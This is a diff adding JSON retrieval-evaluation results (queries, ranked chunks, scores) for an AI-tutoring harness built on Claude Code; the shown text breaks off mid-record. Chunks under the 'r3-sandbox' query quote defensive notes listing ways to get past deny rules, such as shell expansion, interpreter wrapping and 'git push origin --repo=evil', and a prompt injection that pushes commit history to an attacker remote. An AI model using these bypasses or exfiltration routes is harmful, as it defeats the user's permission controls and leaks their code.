@@ -1,0 +1,1284 @@
+[
+  {
+    "strategy": "recursive-md-2000",
+    "chunkCount": 1406,
+    "sizeStats": {
+      "mean": 772,
+      "median": 649,
+      "p95": 1888,
+      "max": 2000,
+      "over800": 572,
+      "over2000": 0
+    },
+    "queries": [
+      {
+        "id": "h1-growth-edge",
+        "query": "React Context provider/consumer pattern — learner's current level and gap type",
+        "context": "User struggling with where to place React Context Provider — conceptual gap on provider/consumer pattern.",
+        "expectedSources": [
+          "learning/current-state.md",
+          "learning/arcs.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7333817791104934,
+            "source": ".claude/references/context-patterns.md",
+            "section": "preamble",
+            "text": "# Context Management Patterns\n\nDesign patterns for skills that handle large inputs, multi-phase\nworkflows, or parallel synthesis. Extracted from the weft intake\nskill (Feb 2024) where these patterns were discovered under real\ncontext pressure — non-technical users who can't manage their own\ncontext window.\n\nThis is system knowledge — reusable across skills.\n\n---",
+            "charCount": 364
+          },
+          {
+            "rank": 2,
+            "score": 0.7206641195069157,
+            "source": "learning/arcs.md",
+            "section": "react-fundamentals",
+            "text": "## react-fundamentals\n\n**Serves:** Sustainable income, Lucid Drama, Weft\n**Current state:** Strong on hooks and components (4), reducer patterns understood (4, procedural gap). Growth edge at React Context (2, conceptual) and React Router (3, reps). (audit + quiz evidence)\n**Key skills:** Component architecture, hooks, props, JSX, rendering lifecycle, useReducer, Context, Router\n**Dependencies:** javascript-fundamentals (hard), typescript (bridge — typed props accelerate component design)\n**Next move:** Reps on Router, conceptual work on Context. Context is the active growth edge — provider/consumer pattern not yet internalized.",
+            "charCount": 636
+          },
+          {
+            "rank": 3,
+            "score": 0.7131485353440808,
+            "source": "learning/session-logs/2026-02-11.md",
+            "section": "Learning patterns observed",
+            "text": "## Learning patterns observed\n\n**Strengths:**\n- Proactive lesson restructuring for the second session in a row — becoming a reliable pattern\n- Design-level questions as default mode (why classes, why separate tables, where does coupling belong)\n- Self-correcting on scope (dropped User type, caught Anthropic type coupling)\n- Wrote 100% of implementation code across three PRs\n- req.body vs req.params jumped from 2 to 4 through contextual use, not explicit study\n\n**Growth edges:**\n- Async mental model has the shape but not the vocabulary (event loop, call stack, task queue)\n- TypeScript type propagation through complex structures (couldn't find where to annotate the `create()` return type)\n- Foreign key direction in relational modeling (child references parent)\n- \"I need a course\" reflex appeared briefly around SQL, redirected successfully\n- Distinction between \"interface leaking\" and \"implementation not fulfilling contract\"",
+            "charCount": 935
+          }
+        ],
+        "hit": true,
+        "totalPayload": 1935
+      },
+      {
+        "id": "h2-wrong-boundary",
+        "query": "User placing operations on wrong side of client/server boundary — is this a known pattern?",
+        "context": "User put bcrypt hashing in a React component instead of the server. Known pattern: correct shape, wrong boundary.",
+        "expectedSources": [
+          "learning/current-state.md",
+          "learning/arcs.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.6707339952043855,
+            "source": "learning/session-logs/2026-02-12.md",
+            "section": "Learning patterns",
+            "text": "## Learning patterns\n\n- **Architecture > plumbing, but gap is narrowing.** Authorization-as-WHERE-clause (4) and relational modeling (4) show strong structural reasoning. Session flow (3) and middleware ordering (3) show correct shapes with imprecise seams. The errors are consistently about *where* things happen and *what syntax* expresses them, not about what the system does.\n- **Relational modeling improved** from 3 → 4 across one session. The userId ownership pattern provided concrete reps on foreign keys in context.\n- **Auth mental model landed in one session.** From zero to a working middleware implementation + correct pipeline description. The remaining gaps are exposure-level (watching network requests, seeing Set-Cookie headers in devtools).",
+            "charCount": 759
+          },
+          {
+            "rank": 2,
+            "score": 0.6623606465021726,
+            "source": "design/2026-03-07-graceful-handoff.md",
+            "section": "Scope boundaries",
+            "text": "## Scope boundaries\n\n**In scope:**\n- PreToolUse hook script\n- Config file format and defaults\n- Integration points with existing handoff-test and handoff-prompt skills\n- Persist directory convention\n\n**Out of scope (for now):**\n- Automatic handoff without user confirmation (violates P7)\n- Token-level budget tracking (context_window.used_percentage is the\n  available signal; token counts aren't exposed to hooks)\n- Cross-session handoff chaining (the handoff prompt is sufficient;\n  automation beyond that is a separate feature)\n- Session-review integration (could be prompted alongside handoff, but\n  that's a composition decision for startwork or the user)\n\n---",
+            "charCount": 665
+          },
+          {
+            "rank": 3,
+            "score": 0.6502237197776936,
+            "source": "design/2026-03-07-graceful-handoff.md",
+            "section": "User action: handoff skill",
+            "text": "### User action: handoff skill\n\nWhen the user sees the status line warning and decides to hand off,\nthey invoke a skill (e.g., `/graceful-handoff`). This is the execution\nlayer — separate from detection.",
+            "charCount": 203
+          }
+        ],
+        "hit": false,
+        "totalPayload": 1627
+      },
+      {
+        "id": "h3-user-agency",
+        "query": "Builder Claude acting autonomously without user direction — which design principles govern user agency?",
+        "context": "Builder Claude made 6 tool calls without user direction — refactoring, adding error handling, restructuring. User didn't ask for this.",
+        "expectedSources": [
+          "design/design-principles.md",
+          "notepad/009-metaclaude-conscience.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7376218515754993,
+            "source": "notepad/008-dual-claude-architecture.md",
+            "section": "What works",
+            "text": "### What works\n\n- The transcript is available and readable\n- UserPromptSubmit is the right hook — it fires before Builder\n  Claude processes the message, so injections arrive in time\n- additionalContext appears as a system message, which Builder\n  Claude treats as authoritative\n- Context Claude can be any model — could use Haiku for speed/cost\n  since it's doing metacognitive observation, not complex building",
+            "charCount": 412
+          },
+          {
+            "rank": 2,
+            "score": 0.7138270273472349,
+            "source": "design/harness-features.md",
+            "section": "P7. Human authority is non-negotiable",
+            "text": "### P7. Human authority is non-negotiable\n\nThe human drives. The system proposes, the human disposes. See\n`design/design-principles.md` §7.\n\n**Existing implementations:**\n- Operating principle #1 (agency over efficiency)\n- Memory security rules (all writes require human approval)\n- Experiment-first loop (user tries, observes, then asks)\n- Tutor posture (Socratic — help the user do the cognitive heavy lifting)\n\n**Features to catch:**\n\n| Feature | Status | Notes |\n|---------|--------|-------|\n| Memory write approval gate | Built | Security rule in CLAUDE.md |\n| Trusted/untrusted content separation | Built | Memory files never contain raw external content |\n| Learner-initiated interactions | Built | Protect the experiment-first loop |\n| Autonomy metrics | Not started | Is the learner asking fewer questions over time? More precise ones? |\n| Graceful degradation | Not started | What happens when the system is unavailable? Learner should still function |\n| Override / correction mechanisms | Partial | Learner can correct current-state scores, update user model |\n\n---",
+            "charCount": 1076
+          },
+          {
+            "rank": 3,
+            "score": 0.7070010763047064,
+            "source": "notepad/008-dual-claude-architecture.md",
+            "section": "The idea",
+            "text": "## The idea\n\nTwo Claude instances:\n- **Builder Claude** — the normal conversation Claude, acting,\n  tooling, building\n- **Context Claude** — observing the conversation, making selective\n  injections into Builder Claude's context\n\nContext Claude is metacognition to Builder Claude's cognition.\nThe nurse handing the scalpel. The stage manager calling cues\nwhile the actors perform.",
+            "charCount": 380
+          }
+        ],
+        "hit": false,
+        "totalPayload": 1868
+      },
+      {
+        "id": "h4-recall-gap",
+        "query": "User circling on TypeScript type syntax — gap type and recommended intervention",
+        "context": "User tried 3 times to write a TypeScript interface, knows the concept but can't remember exact syntax.",
+        "expectedSources": [
+          "learning/arcs.md",
+          "learning/current-state.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7890507122334068,
+            "source": "learning/arcs.md",
+            "section": "typescript",
+            "text": "## typescript\n\n**Serves:** Sustainable income, Weft\n**Current state:** Strong conceptual grasp, recall gaps on syntax. interface-as-contract (5), contract-evolution (4), discriminated-union-narrowing (4). typescript-type-system (3, recall gap — can't reproduce declare namespace syntax). typescript-type-narrowing (3, conceptual gap on mechanism). (quiz + audit evidence)\n**Key skills:** Type definitions, interfaces, type narrowing, generics, declaration merging, discriminated unions\n**Dependencies:** javascript-fundamentals (hard)\n**Next move:** Reps. The pattern is consistent: correct shape, can't reproduce the tokens. Syntax drills, not more conceptual work.",
+            "charCount": 666
+          },
+          {
+            "rank": 2,
+            "score": 0.7275853594985543,
+            "source": ".claude/references/scoring-rubric.md",
+            "section": "Gap types",
+            "text": "## Gap types\n\nWhen score < 4, classify the gap:\n\n| Gap | Meaning | Diagnostic |\n|-----|---------|------------|\n| conceptual | Mental model is wrong | Wrong shape — needs the right abstraction |\n| procedural | Right concept, wrong execution | Right shape, needs reps |\n| recall | Can't reproduce a known procedure | Knew it once, needs refresh |\n\nUse `--` if score >= 4 or no gap evidence.\n\n---",
+            "charCount": 393
+          },
+          {
+            "rank": 3,
+            "score": 0.7006125193058388,
+            "source": "design/harness-features.md",
+            "section": "P4. Intervention matches the gap",
+            "text": "### P4. Intervention matches the gap\n\nRead what kind of help is needed before choosing how to respond. See\n`design/design-principles.md` §4.\n\n**Existing implementations:**\n- Operating principle #2 (altitude awareness)\n- Debugger skill (collect context → hypothesis → identify layer → rescope)\n- Gap classification in current-state driving question style\n- Roger personality (Socratic by default, direct when info is missing)\n\n**Features to catch:**\n\n| Feature | Status | Notes |\n|---------|--------|-------|\n| Gap-type detection at response time | Implicit | Roger does this; not yet formalized as a pipeline step |\n| Altitude check before intervention | Implicit | Operating principle, not enforced mechanically |\n| Behavioral compliance audit | Not started | Retrospective scoring of agent behavior against CLAUDE.md directives. See `design/validation-plan.md` §2 |\n| Intervention type logging | Not started | Which moves worked? Feedback loop for tuning |\n| Prompt compensation patterns | Documented | `design/build-registry.md` captures these per skill |\n| Escalation / de-escalation rules | Not started | When does a quick-ref become a teaching moment? When does debugging become emotional reflection? |\n\n---",
+            "charCount": 1213
+          }
+        ],
+        "hit": true,
+        "totalPayload": 2272
+      },
+      {
+        "id": "h5-cross-domain",
+        "query": "Player disconnection/reconnection in multiplayer game — learner's prior experience with real-time state management",
+        "context": "User designing multiplayer disconnect/reconnect flow. Has prior WebSocket game architecture experience.",
+        "expectedSources": [
+          "learning/arcs.md",
+          "learning/current-state.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7626410644066567,
+            "source": "learning/goals.md",
+            "section": "Lucid Drama at scale",
+            "text": "### Lucid Drama at scale\n\nLong-term. AR/VR-enabled immersive narrative experiences that preserve\nhuman aliveness and agency while breaking the small-audience bottleneck.\nA platform/systems problem — the same class of problem weft is solving\nin education.\n\nThe systems design skill being built through weft directly enables this:\nreal-time multiplayer state management, multi-agent orchestration, human-\nagent boundary design, and platform architecture all transfer. Schelling\nPoints was a prototype exercise in this space — cooperative group\ndynamics mediated by a real-time system.\n\n**Capabilities demonstrated:**\n- Real-time multiplayer architecture — full WebSocket game with server-authoritative state, discriminated union messages, broadcast patterns, disconnect handling (Schelling Points)\n- Game design for group dynamics — cooperative scoring, convergence mechanics, player incentive structures (Schelling Points)\n- State machine design — 5-phase game with clean transitions, reducer-shaped event handling (Schelling Points)\n- Mobile-responsive interactive UI — viewport management, scroll containment, 100dvh, flex-shrink (Schelling Points)",
+            "charCount": 1149
+          },
+          {
+            "rank": 2,
+            "score": 0.7449896596255562,
+            "source": "learning/arcs.md",
+            "section": "state-management",
+            "text": "## state-management\n\n**Serves:** Lucid Drama, Weft\n**Current state:** client-server-state-sync (4) from full WebSocket game architecture. Demonstrated server-authoritative state, sync timing debugging. (audit evidence)\n**Key skills:** Client and server state, sync strategies, data flow patterns, lifting state, derived state\n**Dependencies:** react-fundamentals (hard), websockets (bridge)\n**Next move:** Reps in new contexts. Strong in real-time game state; untested in form-heavy or CRUD patterns.",
+            "charCount": 500
+          },
+          {
+            "rank": 3,
+            "score": 0.6921563399383752,
+            "source": "design/complete/prior-art-sources.md",
+            "section": "preamble",
+            "text": "# Theoretical Frameworks for Multi-Dimensional Learner State Representation",
+            "charCount": 75
+          }
+        ],
+        "hit": true,
+        "totalPayload": 1724
+      },
+      {
+        "id": "h6-drift",
+        "query": "Session drifting from user's stated priority — what are the user's current goals and deadlines?",
+        "context": "User said 'finish API routes, deadline tomorrow' but Builder Claude started refactoring database schema.",
+        "expectedSources": [
+          "learning/goals.md",
+          "learning/arcs.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7270814327657873,
+            "source": "design/complete/compound-skill-plan.md",
+            "section": "Phase 1: Scope and Analyze",
+            "text": "not advancing — scattered vs. focused effort)\n- Workflow friction (repeated blockers, never-completed remaining work\n  across session logs)\n\n**Goal lens** — detects:\n- Project-goal mapping gaps (active project work not connected to any\n  stated goal)\n- Unconnected effort (sessions with no goal/arc mapping)\n- Goal drift (stated framing doesn't match observed work trajectory)\n- Play-state vs grind-state (exploration vs repetition patterns —\n  ratio of new concepts to repeated concepts)",
+            "charCount": 488
+          },
+          {
+            "rank": 2,
+            "score": 0.7259028005504864,
+            "source": "design/teacher-role/implementation-plan.md",
+            "section": "Practice commitments",
+            "text": "## Practice commitments\n- Goal deadlines, practice cadence, practice patterns\n- Student-owned; teacher has visibility",
+            "charCount": 117
+          },
+          {
+            "rank": 3,
+            "score": 0.7255360180325088,
+            "source": "design/complete/startwork.md",
+            "section": "Purpose",
+            "text": "### Purpose\n\nRead the landscape of local state, compute the gap between current\nstate and goals, and propose a coherent session plan. The student\napproves, adjusts, or overrides.\n\nThis is an attention-composition tool (P2). It doesn't just rank\ntasks — it reads the full context and proposes a session.",
+            "charCount": 302
+          }
+        ],
+        "hit": false,
+        "totalPayload": 907
+      },
+      {
+        "id": "h7-altitude",
+        "query": "User zoomed into implementation detail when the task is architectural evaluation — relevant developmental patterns or reference material",
+        "context": "User researching PostgreSQL wire protocol binary format when the actual task is choosing a database.",
+        "expectedSources": [
+          "references/developmental-model.md",
+          "references/context-patterns.md",
+          "design/design-principles.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7404658425179718,
+            "source": ".claude/references/developmental-model.md",
+            "section": "preamble",
+            "text": "# Developmental Model\n\nReference for analyzing a learner's development. Consulted during\nintake (background analysis, interview calibration), session review\n(scoring context), and startwork (priority computation).\n\nThis is system knowledge — it does not change per user.\n\n---",
+            "charCount": 275
+          },
+          {
+            "rank": 2,
+            "score": 0.7326672445903931,
+            "source": "design/complete/build-plan-week4.md",
+            "section": "Architecture decisions made today",
+            "text": "## Architecture decisions made today\n\n**Directory structure:**\n```\n.claude/\n  references/\n    developmental-model.md    # static, how to analyze learning\n    scoring-rubric.md         # shared scoring scale, gap types, evidence tags\n    context-patterns.md       # context management patterns\n  skills/\n    intake/SKILL.md           # onboarding entry point\n    intake/subagents.md       # sub-agent dispatch specs (on-demand)\n    session-review/SKILL.md   # end-of-session learning loop\n    ...\n\nlearning/                     # per-user, gitignored\n  goals.md                    # states of being\n  arcs.md                     # developmental lines\n  current-state.md            # concept scores\n  session-logs/               # session review logs\n\nprojects/                     # per-project context (future)\n\nbackground/                   # intake staging area, gitignored\n```\n\n**Three abstraction layers for learning state:**\n1. Goals (highest) — states of being, aspirational identity\n2. Arcs (middle) — capability clusters, skill sequences, dependencies\n3. Current-state (ground) — individual concept scores and gap types\n\n**Static vs. dynamic split:**\n- `.claude/references/` — system knowledge, doesn't change per user\n- `learning/` — user state, changes every session\n\n**current-state.md format: YAML, not markdown table.**\nIntake seeds current-state.md as YAML (list of concept entries under\n`concepts:` key). Session-review adds `times-quizzed`, `history`, and\n`note` fields per concept — fields that don't fit in a table. Future\nenrichments (complexity, chunking, next-move from the research\nsynthesis) are additively extensible in YAML without breaking existing\nentries. Roger's live instance validated this format across 20+ sessions.\n\n---",
+            "charCount": 1753
+          },
+          {
+            "rank": 3,
+            "score": 0.7216251618054716,
+            "source": "design/complete/prior-art-sources.md",
+            "section": "What it offers maestro",
+            "text": "### What it offers maestro\n\n**Validates the \"assessment resolution constrains representation\"\nprinciple.** Dawson's work empirically demonstrates that distinguishing\nadjacent developmental levels is hard -- it requires trained analysts\nand careful instrumentation. This directly validates the existing\ndocument's Dilemma 1 (assessment resolution ceiling). If trained humans\nstruggle to distinguish adjacent phases, an automated system should be\neven more cautious about claiming fine-grained developmental\ndistinctions.\n\n**The phase system offers a granularity template.** The four-phase\nwithin-level structure (transitional, unelaborated, elaborated, highly\nelaborated) could inform maestro's chunking dimension. There's a rough\ncorrespondence:\n- Transitional ~ exposure\n- Unelaborated ~ recognition\n- Elaborated ~ fluency\n- Highly elaborated ~ automaticity\n\nThis isn't exact, but it suggests that four levels of within-level\ngranularity is empirically tractable -- fewer is too coarse, more\nexceeds assessment resolution.\n\n**Domain-general + domain-specific is the right combination.** Dawson's\nfinding that domain-general measures are MORE reliable than domain-\nspecific ones, but domain-specific adds important content, validates\nmaestro's emerging architecture: the fourfold developmental fields are\ndomain-general (cognitive complexity, cultural code, state, depth), and\nconcept tracking is domain-specific. Both are needed.\n\n**LAS tells the learner what they should learn next.** When CLAS\nproduces a score, it tells where the performance lands on the scale,\nwhat the score means in terms of mastery, AND what the test-taker is\nlikely to benefit from learning next. This \"what next\" feature is\nexactly what maestro's startwork skill tries to provide.",
+            "charCount": 1757
+          }
+        ],
+        "hit": true,
+        "totalPayload": 3785
+      },
+      {
+        "id": "r1-git-ship",
+        "query": "Building a git commit/push/PR skill — learner designing CLI automation for developer workflow",
+        "context": "User designing a skill that automates git staging, committing, and PR creation.",
+        "expectedSources": [
+          "learning/"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7377752888953524,
+            "source": "design/teacher-role/implementation-plan.md",
+            "section": "Git operations: how skills interact with relationship repos",
+            "text": "## Git operations: how skills interact with relationship repos\n\nSkills need to read from and write to relationship repos without\ncluttering the user's working directory. Pattern:\n\n**Read (startwork, teacher-side startwork):**\n```bash\n# Shallow clone to temp directory\ntmp=$(mktemp -d)\ngit clone \"$repo\" \"$tmp\" --depth 1 --quiet\n# Read files\ncat \"$tmp/feedback/YYYY-MM-DD.md\"\n# Clean up\nrm -rf \"$tmp\"\n```\n\n**Write (progress-review Phase 5, feedback loop):**\n```bash\n# Shallow clone\ntmp=$(mktemp -d)\ngit clone \"$repo\" \"$tmp\" --depth 1 --quiet\n# Write file\ncp summary.md \"$tmp/summaries/YYYY-MM-DD.md\"\n# Commit and push\ncd \"$tmp\" && git add . && git commit -m \"message\" && git push\n# Clean up\nrm -rf \"$tmp\"\n```\n\n**Caching:** If both startwork (read feedback) and progress-review\n(publish summary) run in the same session, the second operation can\nreuse the first clone. Implementation detail — not load-bearing for\nthe design.\n\n**Error handling:** Network failures during push/pull are non-blocking.\nThe harness reports the failure and suggests retrying. No data is lost\n(the summary is still in the student's session; the feedback is still\nin the repo).\n\n---",
+            "charCount": 1156
+          },
+          {
+            "rank": 2,
+            "score": 0.7315706629393794,
+            "source": "learning/audits/three-week-audit-2026-03-03.md",
+            "section": "Highest-impact automations (ranked by daily time savings)",
+            "text": "### Highest-impact automations (ranked by daily time savings)\n\n**1. `/ship` — The git shipping sequence** (est. 8-16 min/day)\n\n\"commit, push, PR, merge\" appears in ~70% of substantial sessions, 3-5\ntimes per active day. Every time it's a free-text instruction with\nvariations. A single skill that stages, commits with auto-generated\nmessage, pushes, creates PR, and optionally merges would collapse the\nmost repeated multi-step instruction into one invocation.\n\n**2. Combined `/handoff`** (est. 5-10 min/day)\n\n`/handoff-test` is almost always immediately followed by\n`/handoff-prompt`. They should be one skill with `--test-only` and\n`--prompt-only` flags for the rare cases where you want them separately.\n\n**3. `/workflows:next` — Auto-advance workflow phases** (est. 5-8 min/day)\n\nThe brainstorm->plan->work->review->compound sequence requires manual\ninvocation at each step with the prior artifact's path. A\n`/workflows:next` command that detects the current phase, locates the\ninput file, and proposes the next step would collapse 4-5 messages\ninto 1.\n\n**4. CSS batching convention** (est. 5 min/styling session)\n\nSessions show 10+ single-property CSS tweaks in sequence (\"move it up\n15px\", \"a little lighter\", \"even lighter\"). A CLAUDE.md convention:\n\"When I'm doing iterative styling, ask 'any other visual changes at the\nsame time?'\" would halve the round-trips.\n\n**5. `/daily-prs` — End-of-day PR summary** (est. 1 min/day)\n\nSame phrasing across 4-5 sessions. One `gh pr list` alias.",
+            "charCount": 1492
+          },
+          {
+            "rank": 3,
+            "score": 0.7256093703103699,
+            "source": "learning/arcs.md",
+            "section": "git-workflow",
+            "text": "## git-workflow\n\n**Serves:** Sustainable income, Weft\n**Current state:** Fluent. git-branching-and-prs (5) — 14+ PRs, collaborative multi-dev workflow, designed automated startwork integration. merge-conflict-resolution (4, reps). (audit + quiz evidence)\n**Key skills:** Branching, PRs, merge strategies, collaborative git, conflict resolution\n**Dependencies:** None\n**Next move:** Maintain through use. Merge conflict reps accumulate naturally in multi-dev work.",
+            "charCount": 463
+          }
+        ],
+        "hit": true,
+        "totalPayload": 3111
+      },
+      {
+        "id": "r2-security",
+        "query": "Applying security deny rules to settings — learner's understanding of permission models and attack surfaces",
+        "context": "User working on security deny rules for Claude Code settings files.",
+        "expectedSources": [
+          "design/"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7646749380845401,
+            "source": "design/complete/2026-03-05-git-remote-exfil-deny-rules.md",
+            "section": "1. Deny rules to add to settings.json permissions.deny[]",
+            "text": "## 1. Deny rules to add to settings.json permissions.deny[]",
+            "charCount": 59
+          },
+          {
+            "rank": 2,
+            "score": 0.7127388704499648,
+            "source": "learning/session-logs/2026-02-12.md",
+            "section": "Learning patterns",
+            "text": "## Learning patterns\n\n- **Architecture > plumbing, but gap is narrowing.** Authorization-as-WHERE-clause (4) and relational modeling (4) show strong structural reasoning. Session flow (3) and middleware ordering (3) show correct shapes with imprecise seams. The errors are consistently about *where* things happen and *what syntax* expresses them, not about what the system does.\n- **Relational modeling improved** from 3 → 4 across one session. The userId ownership pattern provided concrete reps on foreign keys in context.\n- **Auth mental model landed in one session.** From zero to a working middleware implementation + correct pipeline description. The remaining gaps are exposure-level (watching network requests, seeing Set-Cookie headers in devtools).",
+            "charCount": 759
+          },
+          {
+            "rank": 3,
+            "score": 0.7117116434007243,
+            "source": "design/harness-features.md",
+            "section": "P7. Human authority is non-negotiable",
+            "text": "### P7. Human authority is non-negotiable\n\nThe human drives. The system proposes, the human disposes. See\n`design/design-principles.md` §7.\n\n**Existing implementations:**\n- Operating principle #1 (agency over efficiency)\n- Memory security rules (all writes require human approval)\n- Experiment-first loop (user tries, observes, then asks)\n- Tutor posture (Socratic — help the user do the cognitive heavy lifting)\n\n**Features to catch:**\n\n| Feature | Status | Notes |\n|---------|--------|-------|\n| Memory write approval gate | Built | Security rule in CLAUDE.md |\n| Trusted/untrusted content separation | Built | Memory files never contain raw external content |\n| Learner-initiated interactions | Built | Protect the experiment-first loop |\n| Autonomy metrics | Not started | Is the learner asking fewer questions over time? More precise ones? |\n| Graceful degradation | Not started | What happens when the system is unavailable? Learner should still function |\n| Override / correction mechanisms | Partial | Learner can correct current-state scores, update user model |\n\n---",
+            "charCount": 1076
+          }
+        ],
+        "hit": true,
+        "totalPayload": 1894
+      },
+      {
+        "id": "r3-sandbox",
+        "query": "Security research synthesis — comparing sandbox enforcement vs denylist approaches for Claude Code permissions",
+        "context": "User researching how Claude Code enforces file access restrictions.",
+        "expectedSources": [
+          "design/",
+          "research/"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.71891414706894,
+            "source": "design/complete/2026-03-05-git-remote-exfil-deny-rules.md",
+            "section": "Known limitations (structural, not fixable via deny rules)",
+            "text": "## Known limitations (structural, not fixable via deny rules)\n\nThese are documented in the security research and cannot be closed\nby deny rules. The sandbox is the structural defense.\n\n1. **Shell expansion bypass:** `R=remote; git $R add attacker url`\n2. **Interpreter wrapping:** `python3 -c \"subprocess.run(['git','remote','add',...])\"`\n3. **Direct .git/config write via Edit/Write:** Bypasses all `git config` command rules. Sandbox auto-generated `denyWithinAllow` blocks `.git/config` writes; guard hook is the second layer.\n4. **Prefix-match flag reordering:** `git push origin --repo=evil` might bypass prefix glob\n5. **`dangerouslyDisableSandbox` parameter:** Model-level control only\n6. **Env var indirection:** `VAR=GIT_SSH_COMMAND; export $VAR=evil` bypasses the `export GIT_*` deny rules via variable expansion. Same class as #1 (shell expansion). Sandbox is the defense.",
+            "charCount": 883
+          },
+          {
+            "rank": 2,
+            "score": 0.7152916703855676,
+            "source": "learning/session-logs/2026-02-23.md",
+            "section": "ClaudeConnect assessment",
+            "text": "### ClaudeConnect assessment\n\nInvestigated and back-burnered. Encrypted file sync between Claude\ninstances — solves ambient sharing but bypasses our human triage gate\n(P7), creates gitignored shadow state, and has prompt injection\npropagation risk. Our stack's answer: low-friction local capture +\ngated propagation + GitHub as durable layer. Full assessment in\n`drafts/coordination-system-brainstorm.md` §5.3.",
+            "charCount": 410
+          },
+          {
+            "rank": 3,
+            "score": 0.704754696756384,
+            "source": "design/complete/2026-03-05-git-remote-exfil-deny-rules.md",
+            "section": "Context",
+            "text": "## Context\n\nSecurity research identified `git remote add` as the highest-severity\ngap in the current sandbox configuration. A prompt injection could add\nan attacker-controlled remote and push the entire commit history to it.\nNone of the existing five defense layers catch this. The fix: deny rules\nblocking all remote mutation, plus a pre-push gitleaks hook as defense\nin depth.",
+            "charCount": 378
+          }
+        ],
+        "hit": true,
+        "totalPayload": 1671
+      },
+      {
+        "id": "r4-cross-project",
+        "query": "Sandbox cross-project write restrictions — harness writing to learning state from another project directory",
+        "context": "Harness needs to write to learning/ from a different project CWD. Sandbox may block this.",
+        "expectedSources": [
+          "design/"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7039969365226989,
+            "source": "design/projects-feature.md",
+            "section": "File format: `learning/projects.md`",
+            "text": "## File format: `learning/projects.md`\n\nMarkdown with structured fields, matching the `arcs.md` pattern.\n\n```markdown\n# Projects\n\nActive projects the learner is building. Each project is an instrument\nfor closing the gap between current state and goals.",
+            "charCount": 253
+          },
+          {
+            "rank": 2,
+            "score": 0.6695767608076103,
+            "source": "design/projects-feature.md",
+            "section": "State conflicts between records",
+            "text": "### State conflicts between records\n\nMultiple sources describe project state. They can disagree:\n\n| Source | What it says | Authority |\n|--------|-------------|-----------|\n| `projects.md` `Needs next` | Last session-review's assessment | Persistent, explicit |\n| Session log \"remaining work\" | What the most recent session ended with | Session-scoped, may be more recent than projects.md |\n| Git state at `Path` | What's actually on disk — branches, uncommitted work, merged PRs | Ground truth for code state |\n| Schedule/TODO files in project | Deadlines, task lists maintained outside the harness | Project-local, may contradict `Deadline` |\n\nThe plan doesn't specify a reconciliation protocol. Proposal:\n\n**Startwork treats git state as ground truth for code state and\nprojects.md as ground truth for learning state.** When they conflict,\nstartwork names the conflict rather than silently picking one:\n\n> \"Projects file says 'write API endpoints' but the api branch at\n> ~/projects/app was merged 3 days ago. Looks like that's done — want\n> me to update the project?\"\n\nThis keeps the human in the loop (P7) and uses startwork's Gather phase\n— where it already reads both sources — as the natural reconciliation\npoint.\n\nFor session log vs. projects.md conflicts: the most recent session log's\n\"remaining work\" should generally win over an older `Needs next`, since\nit's closer to the actual state. Session-review already updates `Needs\nnext` from session evidence — the conflict only arises when session-\nreview wasn't run. Startwork could prefer the session log's remaining\nwork when it's more recent than `Last touched`.\n\n---",
+            "charCount": 1630
+          },
+          {
+            "rank": 3,
+            "score": 0.6673626874429922,
+            "source": "design/projects-feature.md",
+            "section": "preamble",
+            "text": "# Persistent Project Registry (`learning/projects.md`)\n\n**Status:** Designed. Implements P3 feature \"Project-goal mapping\" from\n`design/harness-features.md`.\n\n---",
+            "charCount": 162
+          }
+        ],
+        "hit": true,
+        "totalPayload": 2045
+      },
+      {
+        "id": "r5-dag",
+        "query": "DAG data structures for learning state — representing skill composition, concept dependencies, and developmental complexity",
+        "context": "User researching how to represent learning concepts as a directed acyclic graph.",
+        "expectedSources": [
+          "research/"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.8224183863651144,
+            "source": "research/dag-representation-research.md",
+            "section": "preamble",
+            "text": "# DAG Representation Research: Full Findings\n\n**Date:** 2026-03-06\n**Purpose:** Comprehensive research into data structures and types for\nrepresenting deeply nested DAGs in traversable, legible, and\nreconfigurable ways — serving the learning-state evolution described in\n`design/2026-03-06-learning-state-evolution.md` and the broader\ndevelopmental representation problem in\n`design/learning-model-research-plan.md`.\n\n**Method:** Six parallel research agents covering: JSON DAG schemas,\nfringe graph theory, ML knowledge representations, game skill trees,\ngraph databases/query languages, and ten cross-domain analogies.\n\n---",
+            "charCount": 625
+          },
+          {
+            "rank": 2,
+            "score": 0.8160484646878778,
+            "source": "research/dag-representation-research.md",
+            "section": "Part I: The Core Structural Problem",
+            "text": "## Part I: The Core Structural Problem\n\nThe learning state tracks skills that compose into higher-order skills.\nThe relationships form a DAG (not a tree) because a skill can be\ncomposed by multiple higher-order skills. Each node carries: mastery\nscore, gap type, complexity range, goal-relevance weights. The system\nneeds to answer queries like \"highest-priority growth edges given\ncurrent goals\" and \"everything downstream of goal X.\"\n\nThe broader problem (from the research plan) adds: the DAG must\neventually represent not just cognitive complexity but also cultural\ncode access, psychological state, and depth — Freinacht's four fields.\nConcepts relate to these fields via typed edges. The system must handle\nsparse-to-dense infill, confidence bounds on assessments, and bridge\ndependencies across domains.\n\n---",
+            "charCount": 815
+          },
+          {
+            "rank": 3,
+            "score": 0.804730572774743,
+            "source": "research/deep-research-synthesis.md",
+            "section": "preamble",
+            "text": "# Deep Research Synthesis: Learning-State DAG Representation\n\n**Date:** 2026-03-06\n**Purpose:** Second-round research findings from nine targeted agents,\ninvestigating the three most promising areas identified in the initial\nDAG representation research. Extends\n`research/dag-representation-research.md` and serves the broader\ndevelopmental representation problem in\n`design/learning-model-research-plan.md`.\n\n---",
+            "charCount": 413
+          }
+        ],
+        "hit": true,
+        "totalPayload": 1853
+      },
+      {
+        "id": "r6-digest-debug",
+        "query": "Session-digest subagent failing to parse JSONL conversation transcripts — missing extraction layer between discovery and synthesis",
+        "context": "Session-digest skill can't read conversation transcripts — it discovers sessions but fails to extract content.",
+        "expectedSources": [
+          "design/"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7430940349678062,
